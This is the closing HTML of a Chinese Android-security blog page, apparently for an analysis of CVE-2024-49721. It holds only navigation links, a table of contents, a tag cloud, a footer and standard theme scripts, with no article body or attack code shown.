加载时序分析</p><p class="content">Fabricated Runtime Resources Overlay （FRRO） 是 Android 12 引入的一项新功能，它让开发者可以用代码或 shell 命令的方式动态操作 Run...</p></a><a class="next" href="/2025/01/29/android-security-bulletin-index-2025/"><p class="title">Android 2025 年每月安全补丁分析索引<i class="fas fa-chevron-right" aria-hidden="true"></i></p><p class="content">2024 年度补丁分析：点我给大家分享一个好消息，经过一年的研究，我现在在 Google BugHunters 平台上总排名 24，2024 年度第 6 名，Android Program 第 ...</p></a></div></section></article><script>window.subData={title:"CVE-2024-49721 InputMethodSubtypeArray 反序列化漏洞分析",tools:!0}</script></div><aside class="l_side"><section class="widget toc-wrapper shadow blur desktop mobile"><header><i class="fas fa-list fa-fw" aria-hidden="true"></i><span class="name">本文目录</span></header><div class="content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#细节"><span class="toc-text">细节</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#复现"><span class="toc-text">复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#InputMethodInfo"><span class="toc-text">InputMethodInfo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#多字节？少字节！"><span class="toc-text">多字节？少字节！</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#修复"><span class="toc-text">修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol></div></section><section class="widget tagcloud shadow blur desktop mobile"><header><a href="/tags/"><i class="fas fa-tags fa-fw" aria-hidden="true"></i><span class="name">热门标签</span></a></header><div class="content"><a href="/tags/AOP/" style="font-size:15.67px;color:#8e8e8e">AOP</a> <a href="/tags/android/" style="font-size:24px;color:#555">android</a> <a href="/tags/art/" style="font-size:19px;color:#777">art</a> <a href="/tags/dex/" style="font-size:14px;color:#999">dex</a> <a href="/tags/hidden-api/" style="font-size:14px;color:#999">hidden-api</a> <a href="/tags/hook/" style="font-size:15.67px;color:#8e8e8e">hook</a> <a href="/tags/kernel/" style="font-size:15.67px;color:#8e8e8e">kernel</a> <a href="/tags/magisk/" style="font-size:17.33px;color:#828282">magisk</a> <a href="/tags/parcel/" style="font-size:14px;color:#999">parcel</a> <a href="/tags/property/" style="font-size:14px;color:#999">property</a> <a href="/tags/resources/" style="font-size:14px;color:#999">resources</a> <a href="/tags/system/" style="font-size:22.33px;color:#606060">system</a> <a href="/tags/xposed/" style="font-size:17.33px;color:#828282">xposed</a> <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size:20.67px;color:#6c6c6c">安全</a> <a href="/tags/%E5%AE%89%E5%85%A8%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90%E6%A0%8F%E7%9B%AE/" style="font-size:15.67px;color:#8e8e8e">安全补丁分析栏目</a> <a href="/tags/%E5%B9%B4%E9%89%B4/" style="font-size:15.67px;color:#8e8e8e">年鉴</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/" style="font-size:14px;color:#999">数据结构与算法</a> <a href="/tags/%E6%B3%A8%E5%85%A5/" style="font-size:15.67px;color:#8e8e8e">注入</a> <a href="/tags/%E8%88%AA%E7%A9%BA/" style="font-size:14px;color:#999">航空</a> <a href="/tags/%E9%97%B2%E8%81%8A/" style="font-size:17.33px;color:#828282">闲聊</a></div></section></aside><footer class="clearfix"><br><br><br><div class="social-wrapper"><a href="/atom.xml" class="social fas fa-rss flat-btn" target="_blank" rel="external nofollow noopener noreferrer"></a> <a href="mailto:a1364259@163.com" class="social fas fa-envelope flat-btn" target="_blank" rel="external nofollow noopener noreferrer"></a> <a href="https://github.com/canyie" class="social fab fa-github flat-btn" target="_blank" rel="external nofollow noopener noreferrer"></a></div><div><p>博客内容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p></div>本站使用 <a href="https://volantis.js.org/" target="_blank" class="codename">Volantis</a> 作为主题，总访问量为 <span id="busuanzi_value_site_pv"><i class="fas fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span> 次<div class="copyright"><p>如对本站有任何疑问或建议，欢迎到 <a href="https://github.com/canyie/canyie.github.io/issues/" target="_blank" rel="noopener">issues 区</a> 反馈~</p></div></footer><script>setLoadingBarProgress(80)</script><script>setLoadingBarProgress(60)</script></div><a class="s-top fas fa-arrow-up fa-fw" href="javascript:void(0)"></a></div><script src="https://cdn.jsdelivr.net/npm/jquery@3.4/dist/jquery.min.js"></script><script>var SEARCH_SERVICE="hexo",ROOT="/";ROOT.endsWith("/")||(ROOT+="/")</script><script async src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2/js/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script><script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script><script type="text/javascript">$(function(){Waves.attach(".flat-btn",["waves-button"]),Waves.attach(".float-btn",["waves-button","waves-float"]),Waves.attach(".float-btn-light",["waves-button","waves-float","waves-light"]),Waves.attach(".flat-box",["waves-block"]),Waves.attach(".float-box",["waves-block","waves-float"]),Waves.attach(".waves-image"),Waves.init()})</script><script async src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js"></script><script type="text/javascript">$(function(){var a=["https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/BBC19066-E176-47C2-9D22-48C81EE5DF6B.jpeg"];!function(a){for(var t=a.length;t--;){var r=Math.floor(Math.random()*t),n=a[r];a[r]=a[t],a[t]=n}}(a),$.backstretch(a,{duration:"20000",fade:"1500"})})</script><script src="/js/app.js"></script><script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.4/js/search.js"></script><script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2/js/comment_typing.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script><script>function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('fa-copy');
        $icon.addClass('fa-check-circle');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('fa-check-circle');
          $icon.addClass('fa-copy');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('fa-copy');
        $icon.addClass('fa-times-circle');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('fa-times-circle');
          $icon.addClass('fa-copy');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);</script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script>let LAZY_LOAD_IMAGE = "[object Object]";
  $(".article-entry").find("div.fancybox").find("img").each(function () {
      var element = document.createElement("a");
      $(element).attr("data-fancybox", "gallery");
      $(element).attr("href", $(this).attr("src"));
      /* 图片采用懒加载处理时,
       * 一般图片标签内会有个属性名来存放图片的真实地址，比如 data-original,
       * 那么此处将原本的属性名src替换为对应属性名data-original,
       * 修改如下
       */
       if (LAZY_LOAD_IMAGE) {
         $(element).attr("href", $(this).attr("data-original"));
       }
      $(this).wrap(element);
  });</script><script>setLoadingBarProgress(100)</script><script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var i=n.imageLazyLoadSetting.isSPA,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){i&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,e,a=0;a<r.length;a++)t=r[a],e=void 0,0<=(e=t.getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(n.innerHeight||document.documentElement.clientHeight)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e&&e()},n.src=i}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body></html>